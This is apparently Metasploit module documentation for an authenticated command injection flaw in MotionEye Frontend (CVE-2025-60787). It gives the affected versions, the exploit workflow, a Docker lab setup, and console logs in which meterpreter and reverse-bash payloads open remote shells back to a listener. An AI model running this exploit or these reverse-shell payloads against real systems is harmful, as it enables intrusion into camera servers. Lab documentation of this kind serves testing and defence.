## Vulnerable Application

This module exploits a template injection vulnerability in the [MotionEye Frontend](https://github.com/motioneye-project/motioneye).

MotionEye Frontend versions 0.43.1b4 and prior are vulnerable to OS Command Injection in configuration parameters such as `image_file_name`.
Unsanitized user input is written to MotionEye Frontend configuration files, allowing remote authenticated attackers with admin access to achieve code execution.

Successful exploitation will result in the command executing as the user running
the web server, potentially exposing sensitive data or disrupting survey operations.

An attacker can execute arbitrary system commands in the context of the user running the web server.

## Exploit Workflow

1. Adds a new camera in MotionEye Frontend.
2. Injects the payload into the `image_file_name` field (used for naming camera screenshots).
3. Captures a screenshot ("snapshot" in the terminology of MotionEye), triggering the payload.

## Testing

1. Use Docker to set up the MotionEye app

`docker run -p 9999:8765 ghcr.io/motioneye-project/motioneye@sha256:2dcc3c4da1830ef824067375b2e022fa28c5fdbca773f5496bd35543ec45bef7`

2. Open http://127.0.0.1:9999/ and make sure the app is available

## Scenario

### cmd/linux/http/x64/meterpreter/reverse_tcp

```
msf6 > use exploit/multi/http/motioneye_auth_rce_cve_2025_60787
[*] No payload configured, defaulting to cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/motioneye_auth_rce_cve_2025_60787) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 exploit(multi/http/motioneye_auth_rce_cve_2025_60787) > set RPORT 9999
RPORT => 9999
msf6 exploit(multi/http/motioneye_auth_rce_cve_2025_60787) > set FETCH_SRVHOST 172.17.0.1
FETCH_SRVHOST => 172.17.0.1
msf6 exploit(multi/http/motioneye_auth_rce_cve_2025_60787) > set PASSWORD 12345
PASSWORD => 12345
msf6 exploit(multi/http/motioneye_auth_rce_cve_2025_60787) > run

[*] Started reverse TCP handler on 192.168.19.130:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Detected version 0.43.14, which is vulnerable
[*] Adding malicious camera...
[+] Camera successfully added
[*] Setting up exploit...
[+] Exploit setup complete
[*] Triggering exploit...
[+] Exploit triggered, waiting for session...
[*] Sending stage (3045380 bytes) to 172.17.0.2
[*] Meterpreter session 1 opened (192.168.19.130:4444 -> 172.17.0.2:38124) at 2025-10-04 21:08:57 -0400
[*] Removing camera
[+] Camera removed successfully

meterpreter > sysinfo
Computer     : 172.17.0.2
OS           : Debian 13.1 (Linux 6.11.2-amd64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
```

### cmd/unix/reverse_bash

```
msf6 > use exploit/multi/http/motioneye_auth_rce_cve_2025_60787
[*] No payload configured, defaulting to cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/motioneye_auth_rce_cve_2025_60787) > set payload cmd/unix/reverse_bash
payload => cmd/unix/reverse_bash
msf6 exploit(multi/http/motioneye_auth_rce_cve_2025_60787) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 exploit(multi/http/motioneye_auth_rce_cve_2025_60787) > set RPORT 9999
RPORT => 9999
msf6 exploit(multi/http/motioneye_auth_rce_cve_2025_60787) > run

[*] Started reverse TCP handler on 192.168.19.130:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Detected version 0.43.14, which is vulnerable
[*] Adding malicious camera...
[+] Camera successfully added
[*] Setting up exploit...
[+] Exploit setup complete
[*] Triggering exploit...
[+] Exploit triggered, waiting for session...
[*] Command shell session 1 opened (192.168.19.130:4444 -> 172.17.0.2:60160) at 2025-10-06 04:46:34 -0400
[*] Removing camera
[+] Camera removed successfully

cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 13 (trixie)"
NAME="Debian GNU/Linux"
VERSION_ID="13"
VERSION="13 (trixie)"
VERSION_CODENAME=trixie
DEBIAN_VERSION_FULL=13.1
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```

## Script for signing requests

A script for manually signing requests is available in data/exploits/CVE-2025-60787/sign_request.py and can be used for debugging purposes.

Example of usage:
```
python3 ./sign_request.py --method "GET" --path "/config/1/get/?force=true&_=1759747431350&_username=admin" --body "" --key ""
```